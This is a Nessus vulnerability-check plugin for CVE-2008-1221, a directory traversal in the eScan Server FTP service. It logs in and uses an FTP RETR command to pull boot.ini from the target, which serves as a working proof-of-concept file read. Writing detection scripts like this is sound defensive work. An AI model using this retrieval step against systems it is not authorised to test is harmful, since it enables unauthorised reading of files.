#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(31357);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2008-1221");
  script_bugtraq_id(28127);
  script_osvdb_id(43065);
  script_xref(name:"Secunia", value:"29246");

  script_name(english:"eScan Server Management Console (eserv.exe) FTP Server Arbitrary File Download");
  script_summary(english:"Tries to retrieve a local file");

 script_set_attribute(attribute:"synopsis", value:
"The remote ftp server is affected by a directory traversal
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of eScan Management Console / eScan Server installed
on the remote host includes an FTP server that is affected by a
directory traversal vulnerability.  By leveraging this issue,
an unauthenticated, remote attacker can retrieve files on the same
drive as the application." );
 script_set_attribute(attribute:"see_also", value:"http://aluigi.altervista.org/adv/escaz-adv.txt" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2008/Mar/107" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/03/07");
 script_cvs_date("$Date: 2016/10/10 15:57:05 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_keys("ftp/login", "ftp/password");
  script_require_ports("Services/ftp", 2021);

  exit(0);
}


include("ftp_func.inc");
include("global_settings.inc");


port = get_ftp_port(default: 2021);


# Make sure the banner looks like eScan.
banner = get_ftp_banner(port:port);
if (!banner || "Microworld Systems FTP server" >!< banner) exit(0);


# nb: to exploit the vulnerability we need to log in.
user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");
if (!user) exit(0);


soc = open_sock_tcp(port);
if (!soc) exit(0);

if (!ftp_authenticate(socket:soc, user:user, pass:pass))
{
  close(soc);
  exit(1, "cannot login with supplied FTP credentials");
}


# Try to exploit the issue to get a local file.
file = "boot.ini";
port2 = ftp_pasv(socket:soc);
if (!port2) exit(0);
soc2 = open_sock_tcp(port2, transport:ENCAPS_IP);
if (!soc2) exit(0);

c = string("RETR /", file);
send(socket:soc, data:string(c, "\r\n"));
s = ftp_recv_line(socket:soc);
if (s =~ "^(425|150) ")
{
  contents = ftp_recv_data(socket:soc2);
  close(soc2);

  # There's a problem if it looks like a boot.ini.
  if ("[boot loader]" >< contents)
  {
    if (report_verbosity)
    {
      report = string(
        "\n",
        "Here are the contents of the file '", file, "' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
ftp_close(socket:soc);
